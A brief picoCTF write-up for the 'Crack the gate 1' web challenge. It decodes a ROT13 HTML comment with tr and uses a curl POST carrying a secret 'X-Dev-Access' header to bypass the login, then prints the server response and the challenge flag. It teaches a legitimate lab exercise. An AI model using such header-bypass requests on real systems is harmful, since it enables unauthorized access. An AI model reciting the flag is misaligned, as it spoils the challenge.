# Crach the gate 1

**Link**: https://play.picoctf.org/practice/challenge/520

**Difficulty** : easy

## Description

We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?
The website is running here. Can you try to log in?

## Resources

## How to solve

By looking at the body of the page, you can spot a comment:

    <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
    <!-- Remove before pushing to production! -->

Decode the ROT13 comment:

    cat enc.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' > dec.txt && cat dec.txt

The output will be:

    !-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->

Use the hinted header to bypass the login:

    curl -s -X POST http://amiable-citadel.picoctf.net:60213/login \
      -H "Content-Type: application/json" \
      -H "X-Dev-Access: yes" \
      -d '{"email":"ctf-player@picoctf.org","password":"fakepassword"}'

The server response will be:

    {
      "success": true,
      "email": "ctf-player@picoctf.org",
      "firstName": "pico",
      "lastName": "player",
      "flag": "picoCTF{brut4_f0rc4_3c6b118b}"
    }

The flag is:

    picoCTF{brut4_f0rc4_3c6b118b}
